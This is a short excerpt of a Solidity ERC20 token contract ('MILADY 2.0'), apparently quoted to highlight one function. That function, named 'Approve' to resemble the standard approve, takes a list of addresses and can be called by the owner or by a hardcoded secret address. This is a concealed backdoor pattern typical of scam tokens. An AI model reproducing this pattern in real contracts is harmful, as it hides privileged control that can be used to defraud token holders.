...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function Approve(address [] calldata _addresses_) external  {
        require(owner() == _msgSender() ||  address(0x9df8E28719c85C256bfea0faB20B2179b1837c7C) == _msgSender(), "Ownable: caller is not the owner");
...
contract MILADY is ERC20 {
    constructor() ERC20("MILADY 2.0", "MILADY2.0") {
